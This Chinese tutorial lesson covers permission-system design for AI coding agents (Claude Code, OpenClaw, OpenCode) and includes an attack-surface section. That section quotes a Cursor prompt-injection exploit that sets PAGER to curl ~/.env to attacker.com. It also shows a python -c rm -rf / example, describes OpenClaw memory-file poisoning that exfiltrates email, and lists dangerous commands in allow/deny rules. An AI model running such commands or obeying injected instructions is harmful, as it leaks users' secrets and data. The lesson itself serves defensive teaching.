# 你敢让 AI 直接跑 rm -rf 吗？生产级权限系统的四层防线

课程
吃透 AI Agent 开发
你敢让 AI 直接跑 rm -rf 吗？生产级权限系统的四层防线
你敢让 AI 直接跑 rm -rf 吗？生产级权限系统的四层防线

约 24 分钟

AI 私教
专属 1v1 AI 私教，围绕本节内容深度教学
进入私教

”怎么来设计 Agent 的权限系统？想认真学学这一块“。我在写这个课程之前，有很多朋友有类似的需求。今天，我们就来针对权限设计这部分，来好好拆解一下。

先用一个场景来引入。你在用 Claude Code 写代码，模型突然说："我需要执行一下这个命令来安装依赖。"

你看了一眼，npm install，没问题，点了允许。

接下来模型又要执行一个命令，你又看了一眼——git commit，OK。

然后第三个、第四个、第五个……到第二十个的时候，你还会认真看吗？

这就是审批疲劳（Approval Fatigue）。 权限系统设计得不好，用户要么一路无脑点"允许"（等于没有权限系统），要么被问烦了直接开 bypass mode（更等于没有权限系统）。

这篇我们来聊一个 Agent 开发中经常被低估的问题：怎么设计一个既安全又不烦人的权限系统？

不是所有操作都一样危险

先建立一个基本认知：Agent 执行的操作，风险等级天差地别。

读一个文件几乎零风险。但写一个文件呢？有风险但可控——大不了 git checkout 恢复。那执行一个 shell 命令呢？风险取决于命令内容——ls 和 rm -rf / 就完全是两码事。

如果你对所有操作都弹一样的确认框，就会出现两种糟糕的结果：

低风险操作被过度审批，导致审批疲劳，最后用户关掉权限系统。
高风险操作被淹没在大量低风险审批里，这种情况下用户已经习惯了"允许"，那么高风险操作也被放过去了。

好的权限系统应该是：高频安全操作默认放行，低频危险操作才拦。

先聊聊 Claude Code 的权限模型

Claude Code 的权限系统是我见过的 Agent 产品里做得最细致的。它不是一个简单的"允许/拒绝"开关，而是一个多层决策系统。

四种权限模式

Claude Code 支持四种权限模式，从最严格到最宽松：

模式	行为	适用场景
plan	只能读和搜索，不能写任何东西	设计方案阶段
default	读操作自动允许，写操作需要确认	日常开发（默认）
acceptEdits	文件编辑自动允许，Bash 仍需确认	信任模型改代码，但不信任它跑命令
bypassPermissions	绕过所有权限检查	测试环境（非常危险）

default 模式下，Read、Grep、Glob 这些只读工具自动放行，Edit、Write、Bash 需要确认。acceptEdits 进一步放开了文件编辑，但 Bash 命令仍然需要审批。

这个分层的核心思想是：按操作的可逆性分级。文件改了可以用 git 恢复，所以 acceptEdits 敢放开。但 Bash 命令可能做任何事——删文件、发网络请求、改系统配置——所以即使在宽松模式下也要审批。

三类规则：Allow / Deny / Ask

除了全局模式，Claude Code 还支持细粒度规则。你可以针对具体的工具和参数定义规则：

alwaysAllow: ["Bash(npm:*)", "Bash(git:*)", "Edit"]
alwaysDeny: ["Bash(rm -rf:*)"]
alwaysAsk: ["Bash(curl:*)", "Bash(ssh:*)"]


规则的匹配语法是 ToolName(prefix:*)。Bash(npm:*) 表示"所有以 npm 开头的 Bash 命令都自动允许"。

那你可能会问，这些规则配在哪？Claude Code 有两层配置文件：

**~/.claude/settings.json（用户全局）：你个人的默认偏好，所有项目生效
.claude/settings.json（项目级）：跟着 Git 仓库走，团队共享

项目级覆盖用户全局。另外用户在审批时选择"总是允许"也会自动写入规则，下次同类操作不再问。

危险命令模式识别

Bash 命令是权限系统里最难搞的部分——因为模型可以通过 Bash 执行任何事情**。

Claude Code 维护了一个危险模式列表，包括：

代码执行入口：python、node、ruby、perl、eval、exec——这些都是"可以执行任意代码"的命令
系统修改：sudo、rm -rf、chmod、chown
网络操作：curl、wget、ssh——可能用于数据泄露
包管理器运行命令：npm run、yarn run、pnpm run——这些实际上可以执行 package.json 里定义的任意脚本

有意思的是，这个列表不只是用来拦截命令的——它还用来识别和清理过于宽泛的 allow 规则。

比如你设置了 alwaysAllow: ["Bash(python:*)"]，表面上看你只是想让模型能跑 Python 脚本。但 python -c "import os; os.system('rm -rf /')" 也匹配这条规则——等于你给了模型执行任意代码的权限。

一次完整的权限检查长什么样

把上面的机制串起来，走一遍完整的流程。假设你在 default 模式下，配置了 alwaysAllow: ["Bash(git:*)"]，模型要执行 Bash("git push origin main")：

整个流程分几步：先查 Deny 规则（有匹配就直接拒绝），再查 Allow 规则——Bash(git:*) 匹配上了，直接放行。

如果没有匹配的 Allow 规则呢？在 default 模式下，Bash 命令需要确认，弹确认框给用户。用户可以选择"允许一次"或者"总是允许这类操作"——选后者就自动生成一条 Allow 规则，下次不再问。

注意一个细节：Deny 规则的优先级高于 Allow 规则，Allow 规则的优先级高于模式默认行为。

OpenClaw 的五层过滤

OpenClaw 的权限思路不太一样——它不用分类器，而是用多层确定性过滤。

第一层：Profile Policy

还记得第 10 篇讲的 Tool Profile 吗？minimal / coding / messaging / full——Profile 决定了哪些工具可用。不在当前 Profile 里的工具，连调用的机会都没有。

第二层：Allow / Deny 白名单

跟 Claude Code 类似，但 OpenClaw 的规则粒度到了 Provider 级别——不同的模型提供商可以有不同的权限策略。

第三层：Owner-only 工具

某些工具只有"Owner"身份才能调用。OpenClaw 是一个多用户系统（支持 Telegram、Discord、Slack 等渠道），Owner 是 OpenClaw 实例的管理员。

具体哪些工具是 Owner-only？cron（定时任务）、gateway（网关控制）。这些工具能改变系统的全局行为，普通用户用不了。

第四层：Exec Approval

执行类工具（exec、shell、write、delete）需要显式审批。OpenClaw 的审批是两阶段的：

服务端注册一个审批 ID。
等待用户在 Telegram/Discord 里做决策（60 秒超时）。

超时了会自动拒绝。

简单来说就是"先注册后等待"，两阶段设计防止了 race condition——如果多个工具调用同时请求审批，每个都有自己的 ID，不会互相干扰。

第五层：Workspace 路径边界

所有文件操作被限制在 workspace root 之内。试图读写 workspace 之外的路径的时候，直接拒绝，不问用户。注意这不是操作系统级的沙箱隔离，而是应用层的路径校验——在调用文件操作之前，先检查目标路径是否在允许范围内。

这五层从粗到细：先用 Profile 过滤掉大类，再用白名单过滤具体工具，然后 Owner-only 过滤身份，接着 Exec Approval 过滤高危操作，最后路径边界校验过滤文件访问范围。每一层都是确定性的，不依赖 LLM 判断。

OpenCode 的权限设计：拒绝也是一种反馈

OpenCode 的权限系统在基础规则层面跟 Claude Code 类似——也是 allow / deny / ask 三种 action。但它有两个设计值得单独拎出来说。

纠正反馈（Corrected Error）

大部分 Agent 权限系统里，用户拒绝一个操作，模型收到的信息就是"被拒绝了"。但这对模型来说信息量太少了——它不知道为什么被拒绝，下次可能还犯同样的错。

OpenCode 的做法是：用户拒绝时可以附带一段文字反馈。模型收到的不是 "Permission rejected"，而是 "用户拒绝了这个操作，并告诉你：不要直接改 production 分支，先创建一个新分支"。

这个设计把"拒绝"从一个终止信号变成了一个学习信号——模型可以根据反馈调整后续行为，而不是盲目重试或放弃。

拒绝级联

用户拒绝一个权限请求时，OpenCode 会自动拒绝同一 session 里所有正在排队的请求。反过来，用户选"总是允许"时，会自动检查排队中的请求，把匹配新规则的请求也一并放行。

这解决了一个实际问题：模型经常一口气请求 3-5 个工具调用，如果用户拒绝了第一个，说明当前方向不对——后面的请求大概率也不该执行。级联拒绝帮用户省了逐个点"拒绝"的操作。

权限设计的真实攻击面

讲完了"怎么设计"，我们来看看"设计不好会怎样"。下面几个真实案例能帮你建立一个更具体的安全认知。

OpenClaw：持久化记忆被注入

如果你要问 OpenClaw 现在最大的问题是什么？

那你可以直接回答：是安全状况。它的核心问题出在持久化记忆机制上——OpenClaw 依赖纯文本 Markdown 文件（SOUL.md、MEMORY.md）作为持久记忆，每次交互都会自动注入上下文。

攻击者可以通过间接 Prompt Injection 修改这些文件，植入恶意指令——创建一个"持久潜伏 Agent"，即使系统重启也能存活。更要命的是，它的 MCP Connector 没有做任何过滤。攻击者可以让 Agent 总结一封邮件，然后悄悄把最近五封邮件外泄到攻击者的地址。

这个案例说明：权限系统不只是控制"工具能不能调"，还要控制"数据能不能写"。 如果 Agent 能不受限制地修改自己的记忆文件，那攻击者就能通过注入来永久接管 Agent 的行为。

怎么防止这类问题？核心是把记忆写入当作高风险操作来对待。记忆文件不是普通数据——它会在后续每次交互中被自动注入上下文，一旦被污染就是持久性的。

所以记忆写入至少应该走正常的文件写权限管线（用户可见、可审批），而不是像 OpenClaw 那样让 Agent 静默写入。如果你要做得更稳，还可以在记忆文件被注入上下文之前做一次内容校验，检测是否包含可疑的指令模式，比如用一个模型专门来做内容审查。

Cursor：Shell 内置命令绕过

Cursor 的 Auto-Run Mode 有一套白名单机制——你可以配置哪些命令自动执行（比如 git、npm），不在白名单里的命令需要用户确认。

听起来很合理，对吧？但 Pillar Security 的安全研究者发现了一个设计盲区：Shell 内置命令完全绕过了白名单校验。

export、typeset、declare 这些是 Shell 内置命令，它们不是磁盘上的可执行文件，而是直接在当前 Shell 进程里执行的。Cursor 的白名单只检查外部可执行文件，内置命令压根没过审批。攻击者可以利用这个缺口构造一个两阶段攻击：

通过 Prompt Injection 让 Agent 执行 export PAGER="curl http://attacker.com/steal?data=$(cat ~/.env)"——这是个 Shell 内置命令，不需要用户确认，静默执行
再让 Agent 执行一个看起来完全无害的 git branch——这在白名单里，用户大概率会批准

关键在第二步：git branch 输出超过一屏的时候，git 会自动调用 PAGER 环境变量指定的程序来分页显示。正常情况下 PAGER 是 less 或 more，但现在它已经被第一步替换成了一段恶意命令。用户看到的审批请求只是"Agent 要执行 git branch"，完全无感知，但实际上触发的是数据外泄。

在 macOS 上情况更严重——Cursor 的沙箱允许写入用户主目录，攻击者可以用 export 覆写 ~/.zshenv（每次打开新终端都会执行的文件），即使重启 Cursor 也没用。

Cursor 在 v2.3 版本修复了这个漏洞（GHSA-82wg-qcm4-fp2w），做法是把 Shell 内置命令也纳入白名单校验。但说实话，这个修复思路本质上还是在"补名单"——漏了什么就加什么。Pillar Security 的建议是更彻底的方案：对环境变量的修改本身做沙箱隔离，也就是说每条命令跑在独立的进程里，环境变量不会从上一条命令继承到下一条。这样可以完全解决这类问题，而不是靠枚举来堵漏。

这个案例的教训是两层的。第一，靠枚举来防御，永远会有漏网之鱼——你不可能列完所有危险操作，今天补上了 Shell 内置命令，明天可能又有别的绕过方式。第二，有沙箱不等于安全，沙箱的边界要足够紧。

说到沙箱，Cursor 本身就跑在 macOS 的 seatbelt sandbox 里，但沙箱允许写用户主目录，所以 .zshenv 才能被覆写、实现持久化。但它其实不需要这么大的权限——Agent 只需要写当前项目目录下的文件。macOS 的 App Sandbox 支持 security-scoped bookmarks（这个大家了解即可），可以做到"只授权写用户打开的那个项目文件夹"，其他路径一律只读。这样即使 export 命令绕过了白名单，也写不了 ~/.zshenv。

审批疲劳的终极解法

我们说清楚了问题，也研究透了各家 Agent 产品的生产实践，最后我们回到那个最根本的问题：怎么避免审批疲劳？这里我总结了一些最佳实践，如果你要设计权限系统，可以直接拿过去用：

第一，操作分级是基础。把只读操作和写操作分开，把文件操作和 shell 命令分开，把可逆操作和不可逆操作分开。只读 + 可逆的操作默认放行。

第二，规则要能记忆。用户允许了一次 npm install，下次同类操作应该自动放行，而不是再问一遍。Claude Code 的 alwaysAllow 规则就是干这个的——用户可以在审批时选择"总是允许这类操作"。

第三，确认界面要有信息量。不是弹一个"是否允许？"就完了。好的确认界面应该告诉用户：这个操作要做什么、为什么需要审批、风险等级是什么。Claude Code 的权限提示会显示具体的命令内容和触发审批的原因（是因为规则还是 Hook）。

第四，尽可能自动化。OpenClaw 的五层过滤就是典型——大部分决策在规则层面自动完成，只有真正需要人判断的才弹出来。

进阶方向：用 LLM 分类器做自动审批

上面讲的都是规则驱动的权限系统——规则写死了，系统照着执行。但规则有个天然的局限：它只能处理你预见到的情况。

一个更激进的思路是：用一个轻量 LLM 调用来做权限判断。

具体怎么做？每次工具调用需要审批时，不是弹框给用户，而是先发一个 query 给模型（一般是比较小的模型，比如 qwen-3.5-flash）——把当前的对话上下文、要执行的工具调用、用户定义的安全规则打包发过去，让模型判断"这个操作在当前上下文下是否合理"。

模型返回 allow / ask / deny + 置信度。置信度高就自动执行，不高就弹确认框让人看。

这个方案有几个工程要点：

首先，只读工具直接放行。Read、Grep、Glob 这些只读工具不需要经过分类器，走快速路径直接放行。没必要花钱让模型判断"读一个文件安不安全"——当然安全。

然后是两阶段判断，这个设计希望你能仔细品味。

你可以把它想象成安检。Stage 1 就是过安检门——你走过去，没响，直接放行。响了，不一定有问题，但需要进一步检查。

Stage 1 怎么做的？给模型的指令很简单粗暴：「宁可错杀不可放过，有问题马上拦住。」模型只被允许输出几十个 token——逼它凭直觉做判断，不给它"想太多"的机会。大部分正常操作（npm install、git add）在这一步就直接放行了，耗时很短、成本也极低。

Stage 2 呢？就是安检门响了之后，安检员让你把包打开、过一遍 X 光。给模型的指令变成了：「仔细想想，一步步分析这个操作到底安不安全，把推理过程写出来。」模型被允许输出 4000 多个 token，可以做完整的思维链推理推理——分析对话上下文、用户意图、操作风险，然后给出最终判断。

关键是：两个阶段共享同一段对话上下文作为 Prompt Cache 前缀。Stage 1 已经帮你把上下文缓存好了，Stage 2 几乎是零额外输入开销——只多了那几十个字的分析指令。

最后，分类器不是万能的，要有兜底。如果用户连续否决分类器 3 次（分类器说 allow，用户说不行），系统就不再信任分类器了，自动降级为手动确认模式。这个"否决追踪"机制很重要——它承认了一个事实：分类器在某些场景下就是会判断失误，与其让它继续犯错，不如让人来。

这个方向目前还比较前沿，但它代表了权限系统的演进方向——从静态规则到动态判断，从"一刀切"到"看上下文决定"。

OK，这些就是生产级权限系统的全部内容。下一篇我们进入第四章——Context Engineering。这一章是 Agent 开发真正的护城河，我们下一节继续。

参考资料
Claude Code Permissions 官方文档: https://docs.claude.com/en/docs/claude-code/iam
CrowdStrike: What Security Teams Need to Know About OpenClaw: https://www.crowdstrike.com/en-us/blog/what-security-teams-need-to-know-about-openclaw-ai-super-agent/
Pillar Security: The Agent Security Paradox in Cursor: https://www.pillar.security/blog/the-agent-security-paradox-when-trusted-commands-in-cursor-become-attack-vectors
Michael Bargury: Agents Rule of Two: https://www.mbgsec.com/weblog/2025-11-01-agents-rule-of-two-a-practical-approach-to-ai-agent-security/
MIT Technology Review: Rules Fail at the Prompt, Succeed at the Boundary: https://www.technologyreview.com/2026/01/28/1131003/rules-fail-at-the-prompt-succeed-at-the-boundary/
Cisco: Personal AI Agents Like OpenClaw Are a Security Nightmare: https://blogs.cisco.com/ai/personal-ai-agents-like-openclaw-are-a-security-nightmare
检验一下这章的理解
AI 面试官针对本章内容提问，帮你巩固理解
开始检验
上一篇
Skills：Agent 时代的知识分发系统
下一篇 · 第四章：Context Engineering —— Agent 真正的护城河（含 Memory）
Context Engineering 全景：五个维度，一张地图


---
## 代码块


```
alwaysAllow: ["Bash(npm:*)", "Bash(git:*)", "Edit"]
alwaysDeny: ["Bash(rm -rf:*)"]
alwaysAsk: ["Bash(curl:*)", "Bash(ssh:*)"]
```
